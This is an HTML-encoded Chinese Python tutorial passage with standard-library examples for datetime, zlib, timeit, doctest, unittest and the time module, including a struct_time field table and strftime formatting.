&lt;h3 id=&#34;日期和时间&#34;&gt;&lt;a href=&#34;#日期和时间&#34; class=&#34;headerlink&#34; title=&#34;日期和时间&#34;&gt;&lt;/a&gt;日期和时间&lt;/h3&gt;&lt;p&gt;datetime模块为日期和时间处理&lt;/p&gt;
&lt;p&gt;该模块还支持时区处理&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# dates are easily constructed and formatted&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; datetime &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; date
now &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; date&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;today&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;now&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2021-09-26&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;now&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strftime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%m-%d-%y. %d %b %Y is a %A on the %d day of %B.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 09-26-21. 26 Sep 2021 is a Sunday on the 26 day of September.&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# dates support calendar arithmetic&lt;/span&gt;
birthday &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; date&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1964&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; now &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; birthday
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;days&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 20876&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数据压缩&#34;&gt;&lt;a href=&#34;#数据压缩&#34; class=&#34;headerlink&#34; title=&#34;数据压缩&#34;&gt;&lt;/a&gt;数据压缩&lt;/h3&gt;&lt;p&gt;以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; zlib
s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;witch which has which witches wrist watch&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 41&lt;/span&gt;
t &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; zlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;compress&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 37&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;zlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decompress&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# b&#39;witch which has which witches wrist watch&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;zlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;crc32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 226805979&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;性能度量&#34;&gt;&lt;a href=&#34;#性能度量&#34; class=&#34;headerlink&#34; title=&#34;性能度量&#34;&gt;&lt;/a&gt;性能度量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; timeit &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; Timer
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Timer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;t=a; a=b; b=t&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a=1; b=2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;timeit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.032305799999999996&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Timer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a,b = b,a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a=1; b=2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;timeit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.025154800000000005&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;测试模块&#34;&gt;&lt;a href=&#34;#测试模块&#34; class=&#34;headerlink&#34; title=&#34;测试模块&#34;&gt;&lt;/a&gt;测试模块&lt;/h3&gt;&lt;p&gt;doctest模块提供了一个工具，扫描模块并根据程序中内嵌的文档字符串执行测试&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;average&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;Computes the arithmetic mean of a list of numbers.

    &amp;gt;&amp;gt;&amp;gt; print(average([20, 30, 70]))
    40.0
    &#34;&#34;&#34;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; doctest
doctest&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;testmod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 自动验证嵌入测试&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;unittest模块不像 doctest模块那么容易使用，不过它可以在一个独立的文件里提供一个更全面的测试集&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; unittest

&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;TestStatisticalFunctions&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;unittest&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TestCase&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_average&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;assertEqual&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;average&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;40.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;assertEqual&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;average&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;assertRaises&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ZeroDivisionError&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; average&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;assertRaises&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;TypeError&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; average&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

unittest&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# Calling from the command line invokes all tests&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;时间和日期&#34;&gt;&lt;a href=&#34;#时间和日期&#34; class=&#34;headerlink&#34; title=&#34;时间和日期&#34;&gt;&lt;/a&gt;时间和日期&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示&lt;/li&gt;
&lt;li&gt;时间间隔是以秒为单位的浮点小数&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time  &lt;span class=&#34;token comment&#34;&gt;# 引入time模块&lt;/span&gt;

ticks &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;当前时间戳为:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ticks&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 当前时间戳为: 1632676717.5455847&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;时间元组&#34;&gt;&lt;a href=&#34;#时间元组&#34; class=&#34;headerlink&#34; title=&#34;时间元组&#34;&gt;&lt;/a&gt;时间元组&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th&gt;字段&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;属性&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;0&lt;/td&gt;
&lt;td&gt;4位数年&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_year&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;2008&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td&gt;月&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_mon&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;1 到 12&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td&gt;日&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_mday&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;1 到 31&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td&gt;小时&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_hour&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;0 到 23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td&gt;分钟&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_min&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;0 到 59&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td&gt;秒&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_sec&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;0 到 61 (60或61 是闰秒)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td&gt;一周的第几日&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_wday&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;0到6 (0是周一)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td&gt;一年的第几日&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_yday&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;1 到 366(儒略历)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td&gt;夏令时&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tm_isdst&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;-1, 0, 1, -1是决定是否为夏令时的旗帜&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;获取当前时间&#34;&gt;&lt;a href=&#34;#获取当前时间&#34; class=&#34;headerlink&#34; title=&#34;获取当前时间&#34;&gt;&lt;/a&gt;获取当前时间&lt;/h3&gt;&lt;p&gt;从返回浮点数的时间戳方式向时间元组转换，只要将浮点数传递给如localtime之类的函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

localtime &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;localtime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;本地时间为 :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; localtime&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 本地时间为 : time.struct_time(tm_year=2021, tm_mon=9, tm_mday=27, tm_hour=1, tm_min=24, tm_sec=5, tm_wday=0, tm_yday=270, tm_isdst=0)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;获取格式化的时间&#34;&gt;&lt;a href=&#34;#获取格式化的时间&#34; class=&#34;headerlink&#34; title=&#34;获取格式化的时间&#34;&gt;&lt;/a&gt;获取格式化的时间&lt;/h3&gt;&lt;p&gt;获取可读的时间模式的函数是asctime()&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

localtime &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;asctime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;localtime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;本地时间为 :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; localtime&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 本地时间为 : Mon Sep 27 01:25:32 2021&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;格式化日期&#34;&gt;&lt;a href=&#34;#格式化日期&#34; class=&#34;headerlink&#34; title=&#34;格式化日期&#34;&gt;&lt;/a&gt;格式化日期&lt;/h3&gt;&lt;p&gt;time 模块的 strftime 方法来格式化日期&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strftime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

&lt;span class=&#34;token comment&#34;&gt;# 格式化成2016-03-20 11:45:39形式&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strftime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%Y-%m-%d %H:%M:%S&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;localtime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 格式化成Sat Mar 28 22:24:24 2016形式&lt;/span&gt;
